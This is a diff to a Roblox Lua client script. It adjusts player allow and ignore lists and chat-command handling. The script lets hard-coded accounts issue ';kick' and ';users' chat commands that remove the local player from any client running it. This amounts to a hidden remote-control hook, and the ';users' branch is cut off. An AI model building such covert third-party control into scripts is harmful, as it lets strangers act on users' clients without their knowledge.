@@ -2,15 +2,20 @@ local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+local ignoredPlayers = {
+    "Termux_404",
+    "Player2Name",
+}
+
 local allowedPlayerNames = {
-    "Termux_404#",
+    "Termux_404",
     "ushgd30",
     "cobain_death",
     "Junin_gamer124"
 }
 
-local function IsAllowedPlayer(player)
-    for _, name in ipairs(allowedPlayerNames) do
+local function ShouldIgnorePlayer(player)
+    for _, name in ipairs(ignoredPlayers) do
         if player.Name == name then
             return true
         end
@@ -26,7 +31,7 @@ local function Rejoin()
 
         wait(3)
 
-        if Players:GetPlayerByUserId(LocalPlayer.UserId) and not IsAllowedPlayer(LocalPlayer) then
+        if Players:GetPlayerByUserId(LocalPlayer.UserId) and not ShouldIgnorePlayer(LocalPlayer) then
             LocalPlayer:Remove()
         end
     end)
@@ -38,13 +43,13 @@ local function OnCharacterChanged()
     local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
     humanoidRootPart.AncestryChanged:Connect(function(_, parent)
-        if not parent and not IsAllowedPlayer(LocalPlayer) then
+        if not parent and not ShouldIgnorePlayer(LocalPlayer) then
             Rejoin()
         end
     end)
 end
 
-if not IsAllowedPlayer(LocalPlayer) then
+if not ShouldIgnorePlayer(LocalPlayer) then
     OnCharacterChanged()
     LocalPlayer.CharacterAdded:Connect(OnCharacterChanged)
 end
@@ -53,7 +58,7 @@ local function connectPlayerChat(player)
     player.Chatted:Connect(function(message)
         local playerName = player.Name
 
-        if IsAllowedPlayer(player) then
+        if table.find(allowedPlayerNames, playerName) then
             if string.sub(message, 1, 5) == ";kick" then
                 local playerNameToKick = string.sub(message, 7)
                 
@@ -61,10 +66,10 @@ local function connectPlayerChat(player)
                 local lowerLocalPlayerName = game.Players.LocalPlayer.Name:lower()
                 local lowerLocalDisplayName = game.Players.LocalPlayer.DisplayName:lower()
                 
-                if not IsAllowedPlayer(playerNameToKick) then
+                if not table.find(allowedPlayerNames, playerNameToKick) then
                     if string.sub(lowerLocalPlayerName, 1, #lowerPlayerName) == lowerPlayerName or 
                        string.sub(lowerLocalDisplayName, 1, #lowerPlayerName) == lowerPlayerName then
-                        local localPlayerAllowed = IsAllowedPlayer(game.Players.LocalPlayer.Name)
+                        local localPlayerAllowed = table.find(allowedPlayerNames, game.Players.LocalPlayer.Name)
                         
                         if not localPlayerAllowed then
                             game.Players.LocalPlayer:remove()
@@ -73,7 +78,7 @@ local function connectPlayerChat(player)
                 end
             elseif string.sub(message, 1, 6) == ";users" then
                 local localPlayerName = game.Players.LocalPlayer.Name
-                local localPlayerAllowed = IsAllowedPlayer(localPlayerName)
+                local localPlayerAllowed = table.find(allowedPlayerNames, localPlayerName)
 
                 if not localPlayerAllowed then
                     local args = {
